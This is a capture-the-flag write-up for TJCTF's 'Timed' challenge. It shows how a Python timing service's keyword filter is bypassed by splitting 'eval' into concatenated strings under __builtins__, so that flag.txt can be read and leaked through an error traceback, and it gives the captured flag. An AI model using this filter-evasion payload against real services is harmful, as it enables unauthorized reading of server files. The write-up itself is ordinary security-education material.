# Timed
Misc, 50

>  Written by avz92
>  I found this cool program that times how long Python commands take to run! Unfortunately, the owner seems very paranoid, so there's not really much that you can test. The flag is located in the file flag.txt on the server.
>  nc p1.tjctf.org 8005 

This challenge evaluates a given Python command, with some filtered strings, such as `eval` and `()`. However, we can access `__builtins__`, so we can use eval to evaluate arbitrary code. I read and evaluated the flag file, which reveals the flag in an error:

```
Type a command to time it!
__builtins__["ev"+"al"]("ev"+"al(open('flag.txt').read("+"))")
Traceback (most recent call last):
  File "/timed.py", line 36, in <module>
    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
  File "<timeit-src>", line 6, in inner
    __builtins__["ev"+"al"]("ev"+"al(open('flag.txt').read("+"))")
  File "<string>", line 1, in <module>
  File "<string>", line 1
    tjctf{iTs_T1m3_f0r_a_flaggg}
         ^
SyntaxError: invalid syntax
```

Flag: `tjctf{iTs_T1m3_f0r_a_flaggg}`